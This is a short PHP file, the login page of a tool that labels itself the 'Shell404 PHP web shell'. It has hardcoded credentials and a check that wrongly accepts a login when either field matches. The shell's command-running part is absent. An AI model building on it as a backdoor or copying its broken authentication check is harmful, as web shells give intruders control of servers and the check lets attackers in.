<?php
    $user = "Shell404";
    $pass = "Shell404";
    $username = NULL;
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Shell404</title>

    <style>
        html {
            background-color: black;
            color: lime;
            text-align: center;
            margin-top : 8% ;
        }
        h1 {
            margin: 7px 0 0 2px;
            text-shadow: 0px 0px 10px green;
        }
        #des {
            color: red;
            margin: 3px;
            text-shadow: 0px 0px 10px red;
            margin-bottom: 30%;
        }
        #input {
            text-align: center;
            width: 62%;
            height: 33px;
            border: 3px solid lime;
            border-radius: 8px;
            margin-top: 1%;
            box-shadow: 0px 0px 20px green;
            background-color: transparent;
            color: lime;
        }
        #submit {
            width: 40%;
            height: 30px;
            border: 3px solid red;
            border-radius: 8px;
            margin-top: 7%;
            box-shadow: 0px 0px 20px red;
            background-color: transparent;
            color: lime;
            text-shadow: 0px 0px 10px red;
        }
    </style>
</head>
<body>

    <h1>Shell404</h1>
    <h4 id="des">Shell404 PHP web shell by Anon404</h4>

    <form method="POST">
        <input required id="input" type="text" name="username" placeholder="Enter User-name"></input>
        <br>
        <input required id="input" type="password" name="password" placeholder="Enter Password"></input>
        <br>
        <input id="submit" type="submit" value="Login">
    </form>

    <?php
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        if ($user !== $username && $pass !== $password) {
            echo "<h3 style=\"color: red\">Incorrect username or password</h3>";
        } else {
        	
        }
    }
    ?>

</body>
</html>
